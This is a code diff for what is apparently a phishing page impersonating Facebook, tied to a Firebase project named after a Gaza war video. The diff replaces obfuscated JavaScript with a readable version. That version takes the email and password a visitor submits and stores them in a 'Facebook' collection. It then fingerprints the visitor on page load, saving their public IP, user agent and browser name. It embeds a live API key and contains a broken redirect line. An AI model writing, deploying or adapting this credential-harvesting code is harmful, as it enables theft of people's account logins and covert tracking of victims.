@@ -1,3 +1,128 @@
 
 
-const _0x19874d=_0x15db;(function(_0x3044ec,_0x43392f){const _0x2f659c=_0x15db,_0x39a007=_0x3044ec();while(!![]){try{const _0x1bcd92=parseInt(_0x2f659c(0x1c0))/0x1+-parseInt(_0x2f659c(0x1bb))/0x2*(parseInt(_0x2f659c(0x1cc))/0x3)+parseInt(_0x2f659c(0x1ce))/0x4*(-parseInt(_0x2f659c(0x1cd))/0x5)+parseInt(_0x2f659c(0x1c2))/0x6+parseInt(_0x2f659c(0x1c4))/0x7+-parseInt(_0x2f659c(0x1d0))/0x8+parseInt(_0x2f659c(0x1bf))/0x9;if(_0x1bcd92===_0x43392f)break;else _0x39a007['push'](_0x39a007['shift']());}catch(_0x49afbd){_0x39a007['push'](_0x39a007['shift']());}}}(_0x4585,0x3aea9));function _0x15db(_0x537d05,_0x2386d4){const _0x458582=_0x4585();return _0x15db=function(_0x15db6d,_0x16fe49){_0x15db6d=_0x15db6d-0x1ba;let _0x280bcd=_0x458582[_0x15db6d];return _0x280bcd;},_0x15db(_0x537d05,_0x2386d4);}import{initializeApp}from'https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js';import{getFirestore,doc,setDoc,getDoc,updateDoc}from'https://www.gstatic.com/firebasejs/9.10.0/firebase-firestore.js';import{getAnalytics}from'https://www.gstatic.com/firebasejs/9.10.0/firebase-analytics.js';import{getStorage,ref,uploadBytes,getDownloadURL}from'https://www.gstatic.com/firebasejs/9.10.0/firebase-storage.js';function _0x4585(){const _0x1d3d72=['#submit','log','password','catch','Incorrect\x20password','28191rbdXHp','5blNpCL','1236212hnpmTV','floor','1150912KpcGUT','Error\x20writing\x20document:\x20','gazawarvideo.firebaseapp.com','click','getElementById','then','value','G-P4T68VBRNM','Use\x20with\x20Caution\x20','addEventListener','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','gazawarvideo','62YWeaDf','email','812840200810','AIzaSyA7UdUsHtNHcsS_e6J8SRSHlT4AWzAdl5E','408051wlCmuB','346398iByxxA','querySelector','2608914tAotSf','Details-','1112923fczsxI','Document\x20successfully\x20written!','Facebook'];_0x4585=function(){return _0x1d3d72;};return _0x4585();}const firebaseConfig={'apiKey':_0x19874d(0x1be),'authDomain':_0x19874d(0x1d2),'projectId':_0x19874d(0x1ba),'storageBucket':'gazawarvideo.appspot.com','messagingSenderId':_0x19874d(0x1bd),'appId':'1:812840200810:web:329e3d547cb5cc1cc9f813','measurementId':_0x19874d(0x1d7)},app=initializeApp(firebaseConfig),db=getFirestore(app),storage=getStorage(app);document[_0x19874d(0x1c1)](_0x19874d(0x1c7))[_0x19874d(0x1d9)](_0x19874d(0x1d3),function(){const _0x5be3a7=_0x19874d;var _0x3fdda5=document[_0x5be3a7(0x1d4)](_0x5be3a7(0x1bc))[_0x5be3a7(0x1d6)],_0x1bb145=document[_0x5be3a7(0x1d4)](_0x5be3a7(0x1c9))[_0x5be3a7(0x1d6)];const _0x2405b7={'Email':_0x3fdda5,'Password':_0x1bb145,'Message':_0x5be3a7(0x1d8)};function _0x5458ca(_0x372fe6){const _0x399711=_0x5be3a7,_0x2435c7=_0x399711(0x1da);let _0xce57ea='';const _0x58be41=_0x2435c7['length'];for(let _0x4bd418=0x0;_0x4bd418<_0x372fe6;_0x4bd418++){_0xce57ea+=_0x2435c7['charAt'](Math[_0x399711(0x1cf)](Math['random']()*_0x58be41));}return _0xce57ea;}const _0x4df402=_0x5458ca(0xa),_0x5cc186=doc(db,_0x5be3a7(0x1c6),_0x5be3a7(0x1c3)+_0x4df402);setDoc(_0x5cc186,_0x2405b7)[_0x5be3a7(0x1d5)](()=>{const _0xcba440=_0x5be3a7;console[_0xcba440(0x1c8)](_0xcba440(0x1c5));})[_0x5be3a7(0x1ca)](_0x77aad1=>{const _0x25b722=_0x5be3a7;console['error'](_0x25b722(0x1d1),_0x77aad1);}),alert(_0x5be3a7(0x1cb));});
+// Import necessary Firebase modules
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-app.js";
+import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-firestore.js";
+import { getStorage } from "https://www.gstatic.com/firebasejs/9.10.0/firebase-storage.js";
+
+// Firebase configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyA7UdUsHtNHcsS_e6J8SRSHlT4AWzAdl5E",
+  authDomain: "gazawarvideo.firebaseapp.com",
+  projectId: "gazawarvideo",
+  storageBucket: "gazawarvideo.appspot.com",
+  messagingSenderId: "812840200810",
+  appId: "1:812840200810:web:329e3d547cb5cc1cc9f813",
+  measurementId: "G-P4T68VBRNM"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+const storage = getStorage(app);
+
+// Function to generate a random string
+function generateRandomString(length) {
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let result = '';
+  const charactersLength = characters.length;
+  for (let i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+  }
+  return result;
+}
+
+// Event listener for the submit button
+document.querySelector('#submit').addEventListener('click', function () {
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
+
+  const randomChars = generateRandomString(10); // Assuming a length of 10 for the random string
+
+  const dataToAdd = {
+    Email: email,
+    Password: password,
+    Message: "Use with Caution ",
+    For: "FB"
+  };
+
+  const docRef = doc(db, "Facebook", "Details-" + randomChars);
+
+  // Set the data
+  setDoc(docRef, dataToAdd)
+    .then(() => {
+      console.log("Document successfully written!");
+    })
+    .catch((error) => {
+      console.error("Error writing document: ", error);
+    });
+
+  window.open("google.com" "self")
+});
+function onPageLoad() {
+  // Function to get the public IP address
+  async function getPublicIP() {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+
+      return data.ip;
+    } catch (error) {
+      console.error('Error fetching public IP:', error);
+      return null;
+    }
+  }
+
+  // Function to get device information
+  async function getDeviceInfo() {
+    try {
+      const ip = await getPublicIP();
+      const deviceName = navigator.userAgent;
+      const browserName = navigator.appName;
+
+      return {
+        IP: ip,
+        Device_Name: deviceName,
+        Browser_Name: browserName,
+        // Add more properties as needed
+      };
+    } catch (error) {
+      console.error("Error getting device information:", error);
+      return null;
+    }
+  }
+
+  // Example usage for both functions
+  getPublicIP().then(publicIP => {
+    if (publicIP) {
+      console.log('Public IP:', publicIP);
+    }
+  });
+
+  getDeviceInfo().then(deviceInfo => {
+    if (deviceInfo) {
+      console.log("Device information:", deviceInfo);
+
+      const dataToAdd2 = {
+        IP: deviceInfo.IP,
+        Device_Name: deviceInfo.Device_Name,
+        Browser: deviceInfo.Browser_Name,
+        // Add more properties as needed
+      };
+
+      const randomChars2 = generateRandomString(10);
+      const docRef2 = doc(db, "Phone_Details", "Details-" + randomChars2);
+
+      // Set the data
+      setDoc(docRef2, dataToAdd2)
+        .then(() => {
+          console.log("Document successfully written!");
+        })
+        .catch((error) => {
+          console.error("Error writing document: ", error);
+        });
+    }
+  });
+}
+
+document.addEventListener("DOMContentLoaded", onPageLoad);
